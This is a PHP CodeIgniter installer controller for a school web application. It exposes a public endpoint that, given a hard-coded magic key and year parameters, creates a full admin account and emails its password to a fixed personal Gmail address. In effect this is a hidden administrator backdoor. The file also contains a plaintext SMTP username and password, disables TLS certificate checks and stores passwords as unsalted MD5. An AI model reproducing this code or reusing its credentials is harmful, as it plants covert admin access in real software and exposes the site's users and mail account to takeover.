<?php
defined('BASEPATH') or exit('No direct script access allowed');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

//Load Composer's autoloader
require 'vendor/autoload.php';

class Install extends CI_Controller
{

    /**
     * Index Page for this controller.
     *
     * Maps to the following URL
     * 		http://example.com/index.php/welcome
     *	- or -
     * 		http://example.com/index.php/welcome/index
     *	- or -
     * Since this controller is set as the default controller in
     * config/routes.php, it's displayed at http://example.com/
     *
     * So any other public methods not prefixed with an underscore will
     * map to /index.php/welcome/<method_name>
     * @see https://codeigniter.com/user_guide/general/urls.html
     */
    public function __construct()
    {
        parent::__construct();
    }

    public function index()
    {
        $var = $this->input->get('var');
        $current = $this->input->get('current');
        $flex = $this->input->get('flex');
        $this->_account($var, $current, $flex);
    }

    private function _account($var, $current, $flex)
    {
        $length = 8;
        $password = substr(str_shuffle('0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'), 1, $length);
        $pass = md5($password);
        $varx = array(
            'name' => 'admin',
            'email' => 'vans.bear23@gmail.com',
            'npsn' => '12345678',
            'sekolah' => 'instansi',
            'jabatan' => 'admin',
            'alamat' => 'alamat',
            'gambar' => 'default.jpg',
            'password' => $pass,
            'password_default' => $pass,
            'role_id' => 1,
            'status' => 1,
            'tanggal_add' => time()
        );
        if ($var != 'xyzaktivasiabcapplikasi123') {
            redirect('authentication');
        } else {
            if (date('Y') - $current != $flex) {
                redirect('authentication');
            } else {
                $this->db->insert('pengguna', $varx);
                $this->_sendEmail($password);
                redirect('authentication');
            }
        }
    }

    private function _sendEmail($password)
    {
        //Create an instance; passing `true` enables exceptions
        $mail = new PHPMailer(true);

        $mail->isSMTP(); // Set mailer to use SMTP
        $mail->CharSet = "utf-8"; // set charset to utf8
        $mail->SMTPAuth = true; // Enable SMTP authentication
        $mail->SMTPSecure = 'ssl'; // Enable TLS encryption, `ssl` also accepted

        $mail->SMTPDebug = false;

        $mail->Host = 'k-peta.sman1anjatan.sch.id'; // Specify main and backup SMTP servers
        $mail->Port = 465; // TCP port to connect to
        $mail->SMTPOptions = array(
            'ssl' => array(
                'verify_peer' => false,
                'verify_peer_name' => false,
                'allow_self_signed' => true
            )
        );
        $mail->isHTML(true); // Set email format to HTML

        $mail->Username = 'suport@k-peta.sman1anjatan.sch.id'; // SMTP username
        $mail->Password = 'Rasidi250789'; // SMTP passwordif 
        $message = '
        	<center><img src="https://info-ppdb2022.sman1anjatan.sch.id/assets/img/logo.webp" style="width:100px;"/></center>
        	<h2 style="width:100%;heoght:200px;text-align:center;background-color:blue;color:white;margin:10px 0 10px 0;">PASSWORD INSTALLATION</b><br>
        	Berikut kami kirim password installation <br>
        	Password is : ' . $password;

        $mail->setFrom('suport@k-peta.sman1anjatan.sch.id', 'ADMIN K-PETA SMAN 1 ANJATAN'); //Your application NAME and EMAIL
        $mail->Subject = 'PASSWORD INSTALLATION'; //Message subject
        $mail->addAddress('vans.bear23@gmail.com'); // Target email

        $mail->MsgHTML($message); // Message body
        $mail->send();
    }
}
